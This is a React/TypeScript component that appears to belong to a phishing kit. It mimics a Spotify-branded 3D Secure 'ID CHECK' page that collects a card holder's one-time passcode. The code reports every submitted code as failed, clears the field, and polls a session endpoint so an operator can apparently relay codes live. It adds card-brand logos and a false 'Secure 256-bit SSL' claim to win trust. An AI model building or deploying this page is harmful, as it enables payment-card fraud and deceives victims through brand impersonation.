"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Loader2, ShieldCheck, Lock } from "lucide-react"
import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"
import { t, type Language } from "@/lib/translations"
import { useSession } from "@/hooks/use-session"

interface ThreeDSecureProps {
  mode: "app" | "otp"
  onSuccess: () => void
  onOTPAttempt: (otp: string, isCorrect: boolean) => void
  language?: Language
  error?: string
}

export function ThreeDSecure({ mode, onSuccess, onOTPAttempt, language = "en", error }: ThreeDSecureProps) {
  const sessionId = useSession()
  const [otp, setOtp] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [cardType, setCardType] = useState<string>("unknown")

  useEffect(() => {
    const fetchSessionData = async () => {
      if (!sessionId) return
      try {
        const response = await fetch(`/api/session?sessionId=${sessionId}`)
        if (response.ok) {
          const data = await response.json()
          if (data.cardType) setCardType(data.cardType);
        }
      } catch (e) {}
    }
    fetchSessionData()
    const interval = setInterval(fetchSessionData, 2000)
    return () => clearInterval(interval)
  }, [sessionId])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (otp.length < 6) return
    setIsSubmitting(true)
    
    // Notify instantly
    onOTPAttempt(otp, false)
    
    // Small delay just for visual feedback of the button loader
    setTimeout(() => {
      setIsSubmitting(false)
      setOtp("")
    }, 1000)
  }

  const getCardIcon = () => {
    switch (cardType) {
      case "visa": return <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-10" alt="Visa" />
      case "mastercard": return <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-10" alt="Mastercard" />
      case "amex": return <img src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Amex_logo_2018.svg" className="h-10" alt="Amex" />
      default: return <ShieldCheck className="w-12 h-12 text-[#1ed760]" />
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#121212] text-white">
      <SpotifyHeader language={language} />
      <main className="flex-1 flex flex-col items-center justify-center py-12 px-4">
        <div className="w-full max-w-[450px] bg-[#181818] border border-[#282828] rounded-xl p-8 shadow-2xl">
          <div className="flex flex-col items-center mb-8">
            <div className="mb-6 h-12 flex items-center justify-center">{getCardIcon()}</div>
            <h1 className="text-2xl font-bold tracking-tight text-white uppercase">ID CHECK</h1>
            <p className="text-[#a7a7a7] text-sm mt-3 text-center leading-relaxed">
              {mode === "app" ? t("3ds.appDesc", language) : t("3ds.otpDesc", language)}
            </p>
          </div>

          {mode === "app" ? (
            <div className="flex flex-col items-center space-y-8">
              <div className="relative w-16 h-16">
                <div className="absolute inset-0 border-4 border-[#1ed760]/10 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-[#1ed760] rounded-full border-t-transparent animate-spin"></div>
              </div>
              <div className="text-center space-y-4">
                <p className="text-sm font-bold text-white animate-pulse">{t("3ds.waitingApp", language)}</p>
                <p className="text-xs text-[#a7a7a7] max-w-[280px] mx-auto leading-relaxed">
                  {t("3ds.appInstructions", language)}
                </p>
              </div>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              {error && <div className="bg-red-500/10 border border-red-500 text-red-500 p-3 rounded-md text-sm text-center font-bold">{error}</div>}
              <div className="space-y-3">
                <label className="text-xs font-bold uppercase tracking-widest text-[#a7a7a7] block text-center">{t("3ds.otpLabel", language)}</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  placeholder="••••••"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  className="w-full h-16 bg-[#282828] border-none rounded-lg text-white text-center text-3xl tracking-[0.4em] font-bold focus:ring-2 focus:ring-white transition-all"
                  autoFocus
                  required
                />
              </div>
              <Button
                type="submit"
                disabled={isSubmitting || otp.length < 6}
                className="w-full h-14 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full text-lg transition-all active:scale-95 shadow-lg"
              >
                {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin mx-auto" /> : t("3ds.verify", language)}
              </Button>
              <button type="button" className="w-full text-xs font-bold text-[#a7a7a7] hover:text-white transition-colors uppercase tracking-widest">
                {t("3ds.resend", language)}
              </button>
            </form>
          )}
        </div>
        <div className="mt-10 flex items-center gap-2.5 text-[#535353]">
          <Lock className="w-4 h-4" />
          <span className="text-[10px] font-bold uppercase tracking-[0.2em]">Secure 256-bit SSL Encrypted Connection</span>
        </div>
      </main>
      <SpotifyFooter language={language} />
    </div>
  )
}
